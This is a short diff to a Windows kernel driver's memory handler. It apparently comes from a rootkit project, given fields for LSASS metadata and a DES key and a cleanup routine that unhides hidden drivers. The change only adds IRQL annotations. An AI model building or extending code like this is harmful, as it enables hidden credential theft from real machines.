@@ -1,6 +1,7 @@
 #include "pch.h"
 #include "MemoryHandler.h"
 
+_IRQL_requires_max_(APC_LEVEL)
 MemoryHandler::MemoryHandler() {
 	lsassMetadata.Collected = false;
 	lsassMetadata.DesKey = NULL;
@@ -17,10 +18,9 @@ MemoryHandler::MemoryHandler() {
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
 }
 
+_IRQL_requires_same_
+_IRQL_requires_(PASSIVE_LEVEL)
 MemoryHandler::~MemoryHandler() {
-	IrqlGuard guard;
-	guard.SetExitIrql(PASSIVE_LEVEL);
-
 	auto driverCleaner = [](_In_ HiddenDriverEntry* item) -> void {
 		NidhoggMemoryHandler->UnhideDriver(item->DriverPath);
 	};
